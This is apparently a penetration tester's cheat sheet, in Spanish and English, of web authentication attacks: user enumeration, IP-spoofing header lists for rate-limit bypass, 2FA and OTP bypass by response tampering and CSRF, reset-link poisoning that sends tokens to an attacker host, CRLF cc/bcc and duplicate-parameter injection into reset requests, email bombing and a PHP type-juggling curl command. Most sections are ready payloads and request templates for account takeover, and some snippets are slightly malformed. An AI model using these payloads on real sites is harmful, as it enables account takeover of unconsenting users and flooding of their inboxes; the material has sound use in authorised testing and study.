# Authentication

El sistema de autenticación de un sitio web generalmente consta de varios mecanismos distintos donde pueden ocurrir vulnerabilidades.

Algunas vulnerabilidades son ampliamente aplicables en todos estos contextos, mientras que otras son más específicas de la funcionalidad proporcionada.

Es recomendable tener dos ficheros "users" y "passwords" para testear fuerza bruta.

## Summary

* [Vulnerabilities in Login](#vulnerabilies-in-login)
	* [User Enumeration](#user-enumeration)
* [Bypass Rate Limit](#bypass-rate-limit)
	* [Headers X](#headers-x)
	* [Valid Credentials](#valid-credentials)
	* [Using Similar Endpoints](#using-similar-endpoints)
	* [Array Password](#array-password)
	* [Email Special Characters](#email-special-characters)
* [Autenticación Básica HTTP](#autenticacion-basica-http)
* [Vulnerabilities in Multi-Factor Authentication](#vulnerabilities-in-multi-factor-authentication)
	* [2FA Simple Bypass](#2fa-simple-bypass)
	* [Flawed 2FA Verification Logic](#flawed-2fa-verification-logic)
	* [Brute-Forcing 2FA Verification Codes](#brute-forcing-2fa-verification-codes)
	* [Token Attacks](#token-attacks)
	* [Bypassing 2FA Using Response Manipulation](#bypassing-2fa-using-response-manipulation)
	* [Bypassing 2FA via CSRF attack on Disable 2FA](#bypassing-2fa-via-csrf-attack-on-disable-2fa)
	* [Registro de Móvil](#registro-de-movil)
	* [OTP Bypass on Register Account via Response Manipulation](#otp-bypass-on-register-account-via-response-manipulation)
* [Vulnerabilities in Other Authentication Mechanisms](#vulnerabilities-in-other-authentication-mechanisms)
	* [Explotar Funcionalidad Recordar Usuario](#explotar-funcionalidad-recordar-usuario)
	* [Restablecer Contraseñas Usando una URL](#restablecer-contraseñas-usando-una-url)
	* [Restablecer Contraseñas Usando Token](#restablecer-contraseñas-usando-token)
	* [Restablecer Contraseñas Usando Token-Email](#restablecer-contraseñas-usando-token-email)
	* [Poisoning URL Token](#poisoning-url-token)
	* [Cambiar Contraseñas de Usuarios Aleatorios](#cambiar-contraseñas-de-usuarios-aleatorios)
	* [Bypass de Email de Verificación Después de Registrarse](#bypass-de-email-de-verificacion-despues-de-registrarse)
* [Reset and Forgotten Password Bypass](#reset-and-forgotten-password-bypass)
	* [Password Reset Token Leak Via Referrer](#password-reset-token-leak-via-referrer)
	* [Password Reset With Manipulating Email Parameter](#password-reset-with-manipulating-email-parameter)
	* [Changing Email And Password of any User through API Parameters](#changing-email-and-password-of-any-user-through-api-parameters)
	* [Email Bombing](#email-bombing)
	* [How Password Reset Token is Generated](#how-password-reset-token-is-generated)
	* [Replace Bad Response With Good One](#replace-bad-response-with-good-one)
	* [Try Using Your Token](#try-using-your-token)
	* [Password Reset Via Username Collision](#password-reset-via-username-collision)
* [PHP Type Juggling](#php-type-juggling)


## Vulnerabilities in Login

### User Enumeration

#### Classic User Enumeration

Prestar especial atención al momento de enumerar usarios al "Códigos de estado", "Mensajes de error", "Tiempos de respuesta" y "Errores Tipográficos".

#### User Enumeration mediante Bloqueo de Cuenta

Con el ataque "Cluster Bomb" agregar una posición en blanco al final del cuerpo de la request:

```
username=§invalid-username§&password=example§§.
```

Para el primer conjunto de payloads, seleccione los "username" para enumerar con fuerza bruta.

Para el segundo conjunto de payloads, seleccione el tipo "Null payloads" y elija la opción para generar 10 payloads. Esto hará que cada nombre de usuario se repita 10 veces. 

Notar que las respuestas de uno de los nombres de usuario es más largas que las respuestas cuando se usan otros nombres de usuario, "You have made too many incorrect login attempts". Este nombre de usuario es válido.

## Bypass Rate Limit

### Headers X

Cuando se inicia sesión erróneamente más de 3 veces, hay que verificar si es posible evadir este control de Rate-Limit.

Utilizar algunos headers para falsificar la dirección IP atacante y evadir los controles de bloqueo de IP:

```bash
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarder-For: 127.0.0.1
X-Forward-For: 127.0.0.1
Forwarded-For: 127.0.0.1
Forwarded-For-Ip: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-IP: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Client: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Host: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Host: 127.0.0.1
X-Forwarded-Server: 127.0.0.1
X-HTTP-Host-Override: 127.0.0.1
Forwarded: 127.0.0.1
```

```bash
X-Forwarded-For: [collaborator]
X-Forwarded-For: [collaborator]
X-Forwarded-Host: [collaborator]
X-Client-IP: [collaborator]
X-Remote-IP: [collaborator]
X-Remote-Addr: [collaborator]
X-Host: [collaborator]
X-Originating-IP: [collaborator]
```

Use double X-Forwared-For header

```bash
X-Forwarded-For:
X-Forwarded-For: 127.0.0.1
```

### Valid Credentials

Si la sesión se bloqueo luego de X intentos, es recomendable enviar las credenciales válidas un intento antes de que se bloquee la cuenta al momento de probar fuerza bruta.

```
# INTRUDER ATTACK:

user: invalid_01   |  pass: cualquiera
user: invalid_02   |  pass: cualquiera
user: correcto     |  pass: correcta
user: invalid_03   |  pass: cualquiera
user: invalid_04   |  pass: cualquiera
user: correcto     |  pass: correcta
```


### Using Similar Endpoints

If you are attacking the `/api/v3/sign-up` endpoint, try to perform bruteforce to `/Sing-up`, `/SignUp`, `/singup`, etc.

Also try appending to the original endpoint bytes like:

`%00`
`%0d%0a`
`%0d`
`%0a`
`%09`
`%0C`
`%20`

### Array Password

Es posible bypassear protecciones IP si se puede averiguar cómo adivinar varias contraseñas con una sola solicitud:

```
{
"username" : "userVictima",
"password" : [
    "password01",
    "password02",
    "password03"
    ...
]
}
```

### Email Special Characters

- Adding Null Byte (`%00`) at the end of the Email can sometimes Bypass Rate Limit.
- Try adding a Space Character after a Email. (Not Encoded)
- Some Common Characters that help bypassing Rate Limit : `%0d` , `%2e` , `%09` , `%20` , `%0`, `%00`, `%0d%0a`, `%0a`, `%0C`
- Adding a slash (`/`) at the end of api endpoint can also Bypass Rate Limit:
- `domain.com/v1/login` -> `domain.com/v1/login/`


## Autenticación Básica HTTP

En la autenticación básica HTTP, el cliente recibe un token de autenticación del servidor, que se construye concatenando el nombre de usuario y la contraseña y codificándolos en Base64.

```
Authorization: Basic base64(username:password)
```

## Vulnerabilities in Multi-Factor Authentication

<img src="https://user-images.githubusercontent.com/43796175/117726349-133a2100-b1ac-11eb-89c4-36acbf11cc2d.jpg">

### 2FA Simple Bypass

Cuando se ingresan credenciales correctas, a veces el usuario queda en un estado "logged in" antes de ingresar el código de verificación OTP. En este caso, intentar ir directamente a las páginas de navegación como usuario registrado.

```
# Only Users with Login
http://example.com/my-account
```

Además, intente cambiar el encabezado "Referer" como si viniera de la página 2FA.

### Flawed 2FA Verification Logic

La lógica defectuosa en la autenticación de dos factores significa que después de que un usuario ha completado el paso de inicio de sesión inicial, el sitio web no verifica adecuadamente que el mismo usuario está completando el segundo paso.

Por ejemplo, el usuario inicia sesión con sus credenciales normales en el primer paso de la siguiente manera:

```
POST /login-steps/first HTTP/1.1
Host: vulnerable-website.com
...
username=carlos&password=qwerty
```

Luego se le asigna una cookie que se relaciona con su cuenta, antes de pasar al segundo paso del proceso de inicio de sesión:

```
HTTP/1.1 200 OK
Set-Cookie: account=carlos
```

```
GET /login-steps/second HTTP/1.1
Cookie: account=carlos
```

Al enviar el código de verificación, la solicitud utiliza esta cookie para determinar a qué cuenta está intentando acceder el usuario:

```
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=carlos
...
verification-code=123456
```

En este caso, un atacante podría iniciar sesión con sus propias credenciales, pero luego cambiar el valor de la cookie a cualquier nombre de usuario arbitrario al enviar el código de verificación.

```
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=victim-user
...
verification-code=123456
```

Esto es extremadamente peligroso si el atacante es capaz de aplicar fuerza bruta al código de verificación, ya que le permitiría iniciar sesión en cuentas de usuarios arbitrarios basándose completamente en su nombre de usuario. Ni siquiera necesitarían saber la contraseña del usuario.

### Brute-forcing 2FA Verification Codes

Cuando un sitio web cierra automáticamente la sesión de un usuario si ingresa una cierta cantidad de códigos OTP incorrectos, es posible evadir este filtro creando Macros para Burp Intruder.

La idea es que se vuelve a iniciar sesión automáticamente como el usuario víctima antes de que se cierre la sesión.

*Reference:*
* https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack


#### Límite de Velocidad Falso

Tenga cuidado con un posible límite de velocidad "silencioso" o "falso", pruebe siempre varios códigos y luego el real para confirmar realmente el bloqueo por parte de la aplicación al enviar peticiones fallidas de códigos OTP.

#### Flow Rate Limit pero sin Flow Rate Limit

En este caso hay un límite de velocidad de flujo (tienes que forzarlo muy lentamente: 1 hilo y un poco de retardo antes de 2 intentos) pero no hay límite de velocidad. Entonces, con suficiente tiempo, podrá encontrar el código válido.

#### Reenviar el Código para Restablecer el Límite

Hay un límite de velocidad, pero cuando se vuelve a clickear sobre "resend code", se envía el código y se restablece el límite de velocidad. Luego, puede aplicar fuerza bruta al código mientras lo reenvía para que nunca se alcance el límite de velocidad.

#### Bypass en Funcionalidades Internas

A veces puede configurar el 2FA para algunas acciones dentro de su cuenta (cambiar correo, contraseña ...). Sin embargo, incluso en los casos en los que hubo un límite de velocidad cuando intentó iniciar sesión, no existe ningún límite de velocidad que proteja estas acciones.

#### Falta de Límite de Velocidad para volver a Enviar el Código por SMS

Podrá desperdiciar el dinero de la empresa enviado SMS infinitos.

#### Regeneración infinita de OTP

Si puede generar una nueva OTP infinitas veces, la OTP es bastante simple (4 números), y puede probar hasta 4 o 5 tokens por OTP generada, puede probar las mismas 4 o 5 tokens cada vez y generar OTP hasta coincide con los que está utilizando.


### Token Attacks

- Tal vez pueda reutilizar un token ya usado dentro de la cuenta para autenticarse.

- Verifique si puede obtener un token para su cuenta e intente usarlo para omitir el 2FA en una cuenta diferente.

- Usando la misma sesión, inicie el flujo usando su cuenta y la cuenta de las víctimas. Al llegar al punto 2FA con ambas cuentas, complete el 2FA con su cuenta pero no acceda a la siguiente parte. En lugar de eso, intente acceder al siguiente paso con el flujo de la cuenta de la víctima. Si el back-end solo establece un booleano dentro de sus sesiones diciendo que ha pasado con éxito el 2FA, podrá omitir el 2FA de la víctima.


### Bypassing 2FA Using Response Manipulation

1. Enter correct OTP
2. Intercept & capture the response
3. Logout
4. Enter wrong OTP
5. Intercept & change the response with successful previous response
6. Loggedin

### Bypassing 2FA via CSRF attack on Disable 2FA

1. Signup for two account
2. Login into attacker account & capture the disable 2FA request
3. Generate CSRF POC with `.HTML` extension
4. Login into victim account and fire the request
5. It disable 2FA which leads to 2FA Bypass.

### Registro de Móvil

1. Cree una cuenta con un número de teléfono inexistente.
2. Interceptar la solicitud en BurpSuite.
3. Envíe la solicitud al repetidor y reenvíe.
4. Vaya a la pestaña Repetidor y cambie el número de teléfono que no existe por su número de teléfono.
5. Si tiene una OTP en su teléfono, intente usar esa OTP para registrar ese número inexistente.

### OTP Bypass on Register Account via Response Manipulation

Para inteceptar response de una request:

`Click on action -> Do intercept -> Intercept response to this request.`

#### Primera Técnica

- Registre la cuenta con un número de teléfono móvil y solicite OTP.
- Ingrese OTP incorrecta y capture la request en Burpsuite.
- Intercepte la response a esta request y forwardee la request.
- La response será:
```
{"verificationStatus":false,"mobile":9072346577","profileId":"84673832"}
```
- Cambie esta response a:
```
{"verificationStatus":true,"mobile":9072346577","profileId":"84673832"}
```
- Forwardee la response.
- Luego, estará logeado dentro de la cuenta.

#### Segunda Técnica

- Logee en la aplicación y espere la OTP
- Ingrese una OTP incorrecta y captura la request.
- Intercepte la responsde de esta request y forwardee la request
- La respuesta será algo como:
```
error
```
- Cambie esta respuesta a:
```
success
```
- Y forwardee la respuesta
- Luego estará logeado en el aplicativo

#### Tercera Técnica

1. Registrar 2 cuentas con 2 números móviles (en el primero ingrese la OTP correcta)
2. Intercepte la request
3. Intercepte la response de esa request
4. Verifique cómo se muestra la response, que en este caso será CORRECTA (e.g. "status":1)
5. Ahora, realice el mismo procedimiento con la otra cuenta, pero en este caso ingrese una OTP incorrecta.
6. Intercepte la request
7. Intercepte la response de esa request
8. Observe la response, que en este caso será INCORRECTA (e.g. "status":0)
9. Cambie la respuesta INCORRECTA por la respuesta CORRECTA que obtuvo de la primera solicitud, y si se autentica, entonces logró un bypass de authentication.


## Vulnerabilities in Other Authentication Mechanisms

### Explotar Funcionalidad Recordar Usuario

Esta funcionalidad a menudo se implementa generando un token de "recordarme" de algún tipo, que luego se almacena en una cookie persistente.

Cifrada:

```
Cookie: stay-logged: Y2dvbnphbG86NTFkYzMwZGRjNDczZDQzYTYwMTFlOWViYmE2Y2E3NzA=
```

Descifrada Base64:

```
Cookie: stay-logged: cgonzalo:51dc30ddc473d43a6011e9ebba6ca770
```

Descifrada MD5:

```
Cookie: stay-logged: cgonzalo:peter
```

Luego, desde Intruder es posible enviar valores codificados en Base64 y hasheados con MD5, anteponiendo el "user" en la cookie. Esto desde las opciones de "Payload processing" en Intruder.


### Restablecer Contraseñas Usando una URL

Las implementaciones menos seguras de este método utilizan una URL con un parámetro fácilmente adivinable para identificar qué cuenta se está restableciendo:

```
# Original URL
http://vulnerable-website.com/reset-password?user=victim-user
```

Luego:

```
# Modified URL
http://vulnerable-website.com/reset-password?user=attacker-user
```

### Restablecer Contraseñas Usando Token

Una mejor implementación de este proceso es generar un token de alta entropía difícil de adivinar y crear la URL de restablecimiento basada en eso. En el mejor de los casos, esta URL no debería proporcionar pistas sobre qué contraseña de usuario se está restableciendo.

```
# URL Robusta
http://vulnerable-website.com/reset-password?token=a0ba0d1cb3b63d13822572fcff1a241895d893f659164d4cc550b421ebdd48a8
```

Cuando el usuario visita esta URL, el sistema debe verificar si este token existe en el back-end y, de ser así, qué contraseña de usuario se supone que debe restablecer. Este token debe caducar después de un corto período de tiempo y destruirse inmediatamente después de que se haya restablecido la contraseña.

Sin embargo, algunos sitios web tampoco pueden validar el token nuevamente cuando se envía el formulario de restablecimiento. En este caso, un atacante podría simplemente visitar el formulario de restablecimiento desde su propia cuenta, eliminar el token y aprovechar esta página para restablecer la contraseña de un usuario arbitrario.

Solicitud de reestablecimiento original:

```
POST /forgot-password?token=qNyVusP8ZkUBFAbTB4pOlHwMnvNJT3dg
...
username=user&token=qNyVusP8ZkUBFAbTB4pOlHwMnvNJT3dg
```

Solicitud de reestablecimiento maliciosa borrando el token:

```
POST /forgot-password?token=
...
username=attacker&token=
```

### Restablecer Contraseñas Usando Token-Email

```
https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]
```

### Poisoning URL Token

Si la URL en el correo electrónico de restablecimiento se genera dinámicamente, esto también puede ser vulnerable al envenenamiento de restablecimiento de contraseña. 

Si se envía un enlace que contiene un token de restablecimiento único por correo electrónico, el header `X-Forwarded-Host` o `Host` mismo, tal vez pueden usarse para apuntar el enlace de restablecimiento generado dinámicamente a un dominio arbitrario.

```
POST /forgot-password
X-Forwarded-Host: attackerserver
...
username=victim.com
```

```
POST /forgot-password
Host: attackerserver
...
username=victim.com
```

Cuando llegue el token o email a su servidor atacante, utilícelo para reestablecer la contraseña de la cuenta "victim.com".

Además, puede intentar el Poisoning con estos Headers en la solicitud de `/forgot-password`:

```
X-Forwarded-Host
X-Forwarded-Port
X-Forwarded-Scheme
Origin: 
nullOrigin: [siteDomain].attacker.com
X-Frame-Options: Allow
X-Forwarded-For: 127.0.0.1
X-Client-IP: 127.0.0.1
Client-IP: 127.0.0.1
Proxy-Host: 127.0.0.1
Request-Uri: 127.0.0.1
X-Forwarded: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Server: 127.0.0.1
X-Forwarder-For: 127.0.0.1
X-Forward-For: 127.0.0.1
Base-Url: 127.0.0.1
Http-Url: 127.0.0.1
Proxy-Url: 127.0.0.1
Redirect: 127.0.0.1
Real-Ip: 127.0.0.1
Referer: 127.0.0.1
Referrer: 127.0.0.1
Refferer: 127.0.0.1
Uri: 127.0.0.1
Url: 127.0.0.1
X-Host: 127.0.0.1
X-Http-Destinationurl: 127.0.0.1
X-Http-Host-Override: 127.0.0.1
X-Original-Remote-Addr: 127.0.0.1
X-Original-Url: 127.0.0.1
X-Proxy-Url: 127.0.0.1
X-Rewrite-Url: 127.0.0.1
X-Real-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Custom-IP-Authorization:127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Original-Url:
X-Forwarded-Server:
X-Host:
X-Forwarded-Host:
X-Rewrite-Url:
```


*Reference:*
* https://hackerone.com/reports/167631
* https://hackerone.com/reports/226659



### Cambiar Contraseñas de Usuarios Aleatorios

La funcionalidad de cambio de contraseña puede ser particularmente peligrosa si permite que un atacante acceda a ella directamente sin iniciar sesión como usuario víctima. 

Por ejemplo, si el nombre de usuario se proporciona en un campo oculto, un atacante podría editar este valor en la solicitud para apuntar a usuarios arbitrarios. Esto puede potencialmente explotarse para enumerar nombres de usuario y contraseñas de fuerza bruta.

Desde la cuenta del usuario atacante, debe validar que la aplicación valida primero la contraseña actual y permite el cambio de usuario para esta funcionalidad:

```
# REQUEST

username=usuarioVictima
currentPasswd: invalida123
newPasswd: Test1
repeatNewPasswd: Test2

# RESPONSE

Current password is incorrect
```

```
# REQUEST

username=usuarioVictima
currentPasswd: correcta123
newPasswd: Test1
repeatNewPasswd: Test2

# RESPONSE

New passwords do not match
```

Dependiendo de las respuestas que brinde el aplicativo, es posible aplicar fuerza bruta para conseguir la contraseña válida del usuario víctima. 


### Bypass de Email de Verificación Después de Registrarse

1. Regístrese en la aplicación como `attacker@mail.com`.
2. Recibirá un correo electrónico de confirmación en `attacker@mail.com`, no abra ese enlace ahora.
3. La aplicación puede solicitar la confirmación de su correo electrónico, verifique si permite navegar a la página de configuración de la cuenta.
4. En la página de configuración, compruebe si puede cambiar el correo electrónico.
5. Si está permitido, cambie el correo electrónico a `victim@mail.com`.
6. Ahora se le pedirá que confirme `victim@mail.com` abriendo el enlace de confirmación recibido en `victim@mail.com`, en lugar de abrir el nuevo enlace, vaya a la bandeja de entrada de `attacker@mail.com` y abra el enlace recibido anteriormente.
7. Si la aplicación verifica el mail `victim@mail.com` mediante el enlace de verificación anterior recibido en el correo del atacante, entonces se trata de un bypass de verificación de correo electrónico.


## Reset and Forgotten Password Bypass

### Password Reset Token Leak Via Referrer

1. Solicite el restablecimiento de la contraseña a su dirección de correo electrónico.

2. Haga clic en el enlace de restablecimiento de contraseña.

3. No cambie la contraseña.

4. Haga clic en cualquier sitio web de terceros (por ejemplo: Facebook, Twitter) dentro de la aplicación, sin estar logeado, por supuesto. Por ejemplo, en los íconos de RR.HH. sociales para "compartir" la web víctima.

5. Interceptar la solicitud en el proxy.

6. Compruebe si el "Referer" header tiene un leak de token de password reset.

*References:*
* https://hackerone.com/reports/342693
* https://hackerone.com/reports/272379
* https://medium.com/@rubiojhayz1234/toyotas-password-reset-token-and-email-address-leak-via-referer-header-b0ede6507c6a
https://shahjerry33.medium.com/password-reset-token-leak-via-referrer-2e622500c2c1


### Password Reset With Manipulating Email Parameter

- [ ] Add attacker email as second parameter using &

```php
POST /resetPassword
[...]
email=victim@email.com&email=attacker@email.com
```

- [ ] Add attacker email as second parameter using %20

```php
POST /resetPassword
[...]
email=victim@email.com%20email=attacker@email.com
```

- [ ] Add attacker email as second parameter using \|

```php
POST /resetPassword
[...]
email=victim@email.com|email=attacker@email.com
```

- [ ] Add attacker email as second parameter using cc

```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
```

- [ ] Add attacker email as second parameter using bcc

```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
```

- [ ] Add attacker email as second parameter using ,

```php
POST /resetPassword
[...]
email="victim@mail.tld",email="attacker@mail.tld"
```

- [ ] Add attacker email as second parameter in json array

```php
POST /resetPassword
[...]
{"email":["victim@mail.tld","atracker@mail.tld"]}
```

*Reference*

* https://medium.com/@0xankush/readme-com-account-takeover-bugbounty-fulldisclosure-a36ddbe915be
* https://ninadmathpati.com/2019/08/17/how-i-was-able-to-earn-1000-with-just-10-minutes-of-bug-bounty/
* https://twitter.com/HusseiN98D/status/1254888748216655872

### Changing Email And Password of any User through API Parameters

1. Attacker have to login with their account and go to the "Change Password" function
2. Start the Burp Suite and Intercept the request
3. After intercepting the request sent it to repeater and modify parameters Email and Password

```php
POST /api/changepass
[...]
("form": {"email":"victim@email.tld","password":"12345678"})
```

*Reference*

* https://medium.com/@adeshkolte/full-account-takeover-changing-email-and-password-of-any-user-through-api-parameters-3d527ab27240

### Email Bombing

1. Start the Burp Suite and intercept the "password reset" request
2. Send to intruder
3. Use null payload
4. Send attack
5. Check the inbox

*Reference:*
* https://hackerone.com/reports/280534
* https://hackerone.com/reports/794395

### How Password Reset Token is Generated

Observe cuál es el patrón del token en la función "password reset". Si por ejemplo:

- Generado en base a la marca de tiempo (timestamp)
- Generado en base al UserID
- Generado en base al correo electrónico del usuario
- Generado en base al nombre y apellido
- Generado según la fecha de nacimiento
- Generado en base a criptografía

Use Burp Sequencer to find the randomness or predictability of tokens.

### Replace Bad Response With Good One

Look for the RESPONSE like this:

```php
HTTP/1.1 401 Unauthorized
(“message”:”unsuccessful”,”statusCode:403,”errorDescription”:”Unsuccessful”)
```

Change the REQUEST to:

```php
HTTP/1.1 200 OK
(“message”:”success”,”statusCode:200,”errorDescription”:”Success”)
```

*Reference¨:*

* https://medium.com/@innocenthacker/how-i-found-the-most-critical-bug-in-live-bug-bounty-event-7a88b3aa97b3

### Try Using Your Token

Try adding your "password reset token" with victim’s Account.

```php
POST /resetPassword

email=victim@email.com&code=$YOUR_TOKEN$
```

And another techniques:

```
POST /resetPassword

email=victim@gmail.com&email=attacker@gmail.com
```

```
POST /resetPassword

email=victim@gmail.com%20email=attacker@gmail.com
```

```
POST /resetPassword

email=victim@gmail.com |email=attacker@gmail.com
```

```
POST /resetPassword

email=victim@gmail.com%0d%0acc:attacker@gmail.com
```

*Reference*

* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1


### Password Reset Via Username Collision

Regístrese en el sistema con un nombre de usuario idéntico al de la víctima, pero con espacios en blanco insertados antes y/o después del nombre de usuario.

Por ejemplo: (note los espacios en blanco al principio y final)

```
    "admin"
"admin"  
   "admin"  
```

Solicite un restablecimiento de contraseña con su nombre de usuario malicioso.

Utilice el token enviado a su correo electrónico y restablezca la contraseña de la víctima.

Conéctese a la cuenta de la víctima con la nueva contraseña.

### Name Email Poisoning

```
victim@gmail.com@0xcgonzalo@protonmail.com
```
```
victim@gmail.com@yourdomain.burpcollaborator.net
```
```
username@yourdomain.burpcollaborator.net
```

***

## PHP Type Juggling

If you find PHP logins, it is probable that the `strcmp` function is used, which is vulnerable at the code level:

```
curl -X POST [URL] --data 'username=test&password[]=test2'
```





